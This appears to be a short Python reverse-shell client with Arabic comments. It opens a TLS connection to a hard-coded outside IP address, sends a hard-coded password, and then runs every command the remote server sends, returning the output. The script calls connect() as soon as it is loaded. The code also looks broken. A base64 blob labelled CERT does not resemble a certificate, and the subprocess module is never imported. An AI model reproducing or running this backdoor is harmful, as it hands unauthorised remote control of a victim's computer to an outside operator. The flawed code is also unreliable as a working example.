import socket, ssl
CERT = """eJxlVcmyqkgQ3fMVxu2Nhq9VnNCOuIsCCgQpBAUUNjcYSmRWBgG/vlFfv35DLSDqZObJU5UZWUSQXLO87BWZG+HyW68o4u5TOdc8c3FREAzca58fHx9/PxcNeUHuPSGBExigwRdKIEFg05BhQGb7oBZo4As6UOWjxZp3Kz9xS7SDEtfym8jwWFDUrGqK28wSLndXBiqUCFoFtfOAEgIRD0gd0hfEGAZq4APsaV82OkbERPLF4ePEmYmVfYQNpwHtbXMRwXKdMbJa87gI7ZMcdmQ7BOoXGePXnHaKFTdxG+YBxHdQ0eWKdbR3a041WcJQVZYF80Z++JUcChUK0UwK4RxpAHP1pJU1MEGaW8ssXCCWs19Y+D9GPEHEr37KYGogNjS0RzXsMnQJBBZcWfPYXK1k3TpJfEF7vYb1y7YhWNBonXzeTbjKnMYPc7pq2BCgN1mGaJ1caDMxRWpRM29CiQWiaLDw1Bl54nlWUNe7TtJcCs1WCoWH3M6bHQtr34cBAhOeOdz4g+DMWBXSQNUBmAs0W4OnfUuArCudyuJrmpf1g5esMZolj0LP0mGh0O4moDbGcqw085hXFb/2fD+q6FOpZPsZbg8nk7Ar7ubboLkk6sYUGLPdjFPGAGKMggetmnGeeufsjCVJpLbRaiveElMU0t16Wbr1/Ih84kRFcO8DpT08UkFuzFxtqQNlyA0keVEx/Os2FzdcC6dDKy0pk2WPdEalYq6t1hKYOToBhtS0Yj164gD2HK7qiWyGoWouINWmipKM1UeVw3A2bpa2JznKJKcm08VS0T1aPbfeck7YaJnolEmubW0RrzpnAUXnZi0KPBxuNmJSYKeIqrrEOaa2wj1XwsVy8mDbNLOWUONSQjUMZXMyYMREETucFNTisBqD00Q1PK/rYhoAPkQhqBFYPbvTg11fIGBvaEkYUo5eE5tnbfeTHU2bkJN4Rc82DmfJknnfktPMEW+SXJc3Sfu9nEz9LicBVHotVNaQvxuVvC3Kmppe8x0nIhKUjh8yenOkhIl3D5L7/jhxrrLF0mx8PrXi9rqFFEvM4kApIHMaFqWV7cfbmIfAPBT8MZodjZ07aTVkLshGTAzD1YNyv57w9e3urlXuRAbUEBBI14e3u2/Y0fhSUMvb1GpuS9WSMct4oS9lNFxTkCEriTTc3czStuMtFVj2kM+DDa3WOcEc8eZwbhv1RjqWbJXzKbrI02tJZorIbH1fgBnpGWPoUuO7unBO9WJ4JPnKibiyjEV/TyjlUNL4Rd3g9f1wKe0t3hu7+3p6lXLeAJfr8SIdOLS8Tseu5KzYecJZjzXAt8VNS7oSnYibJvn6YkW2enHcPWzJ4ucz0DUl8Zp4UGb/nILdkOz1/urBxMGeh72ei7uxes7ynhsHOC0JD597bpam2C37g3+IXre6bYmb8rMbuqPDQWLe2/5zq+x32o7ZSV+adPhiJAHK2uDnmFGc2d7XHefBuf2KM9cugywt+q7t2aX9+RT3dq+D8vJ9uI/cHNsl/vouovPv9z9IajVaTkfTGTUiV+THt958PhsMenbxCnrL/MHzX+46t69fb9L+89e9GDjvtHxdsqJM7QR//s77ZvyV8kV7CWLc0/IK/4q/Tpp4n6+QUY7de39FrqeDkYfdzMP9wR/ewfkZ0F1LjfP+4PPzAzdB+fGP0505+sM5q8pr1d37j3du5OPyDfY7lj/Z3zoKnHp2HPffniOcvrUMiB91Jf4F2WhKoQ=="""

def connect():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    with socket.create_connection(("178.62.237.181", 443)) as sock:
        with context.wrap_socket(sock, server_hostname="178.62.237.181") as ssock:
            # إرسال كلمة المرور للتحقق
            password = "mysecretpassword"  # استخدم كلمة المرور التي تريدها
            ssock.sendall(password.encode())

            # استقبال الرد من الخادم (التحقق من كلمة المرور)
            response = ssock.recv(1024).decode()
            if "Authentication successful" in response:
                print("[*] Authentication successful")
                while True:
                    cmd = ssock.recv(8192).decode()
                    if cmd.lower() == "exit": 
                        break
                    output = subprocess.getoutput(cmd)
                    ssock.sendall(output.encode())
            else:
                print("[!] Authentication failed. Closing connection.")
                ssock.close()

connect()
